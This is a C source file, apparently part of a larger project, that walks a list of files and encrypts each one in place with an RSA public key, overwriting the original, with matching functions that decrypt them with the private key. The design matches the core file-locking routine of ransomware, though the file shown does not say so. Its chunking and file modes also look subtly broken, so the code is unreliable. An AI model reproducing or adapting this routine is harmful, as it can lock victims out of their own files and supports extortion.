#include <stdio.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>

#include "crypto.h"

static void encrypt_file(fileData* p_fileData, RSA* p_pubKey)
{
    /* Construct file path */
    char* p_filePath = malloc(strlen(p_fileData->p_path) + strlen(p_fileData->p_name) + 2);
    if (p_filePath == NULL)
    {
        perror("malloc");
        exit(1);
    }
    sprintf(p_filePath, "%s/%s", p_fileData->p_path, p_fileData->p_name);

    /* Open file */
    FILE* p_file = fopen(p_filePath, "r");
    if (p_file == NULL)
    {
        perror("fopen");
        exit(1);
    }

    /* Create temporary file to store encrypted file */
    FILE* p_tempFile = tmpfile();
    if (p_tempFile == NULL)
    {
        perror("tmpfile");
        exit(1);
    }

    /* Encrypt file */
    unsigned char inBuf[BUF_SIZE];
    unsigned char outBuf[BUF_SIZE];
    int len;
    while ((len = fread(inBuf, 1, sizeof(inBuf), p_file)) > 0) {
        int out_len = RSA_public_encrypt(len, inBuf, outBuf, p_pubKey, RSA_PKCS1_PADDING);
        if (out_len == -1) {
            fprintf(stderr, "Erreur lors du chiffrement\n");
            fclose(p_file);
            fclose(p_tempFile);
            exit(2);
        }
        fwrite(outBuf, 1, out_len, p_tempFile);
    }

    /* Re-open the original file in write mode */
    p_file = freopen(p_filePath, "w", p_file);
    if (p_file == NULL)
    {
        perror("freopen");
        exit(1);
    }

    /* Reseting readind head position */
    fseek(p_tempFile, 0, SEEK_SET);

    /* Replace the content of plain file by encrypt file */
    while ((len = fread(inBuf, 1, sizeof(inBuf), p_tempFile)) > 0) {
        fwrite(inBuf, 1, len, p_file);
    }

    /* Close files */
    fclose(p_file);
    fclose(p_tempFile);

    /* free memory */
    free(p_filePath);
}

static void decrypt_file(fileData* p_fileData, RSA* p_privKey)
{

    /* Construct file path */
    char* p_filePath = malloc(strlen(p_fileData->p_path) + strlen(p_fileData->p_name) + 2);
    if (p_filePath == NULL)
    {
        perror("malloc");
        exit(1);
    }
    sprintf(p_filePath, "%s/%s", p_fileData->p_path, p_fileData->p_name);

    /* Open the encrypted file */
    FILE* p_file = fopen(p_filePath, "rb");
    if (p_file == NULL)
    {
        perror("fopen encrypted_file");
        exit(1);
    }

    /* Create a temporary file to store the decrypted file */
    FILE* p_tempFile = tmpfile();
    if (p_tempFile == NULL)
    {
        perror("tmpfile");
        exit(1);
    }

    /* Decrypt the file */
    unsigned char inBuf[BUF_SIZE];
    unsigned char outBuf[BUF_SIZE];
    int len;
    while ((len = fread(inBuf, 1, sizeof(inBuf), p_file)) > 0) {
        int decryptedLen = RSA_private_decrypt(len, inBuf, outBuf, p_privKey, RSA_PKCS1_PADDING);
        if (decryptedLen == -1) {
            fprintf(stderr, "Erreur lors du déchiffrement\n");
            fclose(p_file);
            fclose(p_tempFile);
            exit(2);
        }
        fwrite(outBuf, 1, decryptedLen, p_tempFile);
    }

    /* Re-open the original file in write mode */
    p_file = freopen(p_filePath, "w", p_file);
    if (p_file == NULL)
    {
        perror("freopen");
        exit(1);
    }

    /* Reseting readind head position */
    fseek(p_tempFile, 0, SEEK_SET);

    /* Replace the content of plain file by encrypt file */
    while ((len = fread(inBuf, 1, sizeof(inBuf), p_tempFile)) > 0) {
        fwrite(inBuf, 1, len, p_file);
    }

    /* Close files */
    fclose(p_file);
    fclose(p_tempFile);

    /* free memory */
    free(p_filePath);

}

void encrypt_files(listFileData* p_listFileData, RSA* p_pubKey)
{
    /* Browse all files to encrypt them */
    fileData* p_currentFile = p_listFileData->p_head;
    while (p_currentFile != NULL)
    {
        encrypt_file(p_currentFile, p_pubKey);
        p_currentFile = p_currentFile->p_next;
    }
}

void decrypt_files(listFileData* p_listFileData, RSA* p_privKey)
{
    /* Browse all files to decrypt them */
    fileData* p_currentFile = p_listFileData->p_head;
    while (p_currentFile != NULL)
    {
        decrypt_file(p_currentFile, p_privKey);
        p_currentFile = p_currentFile->p_next;
    }
}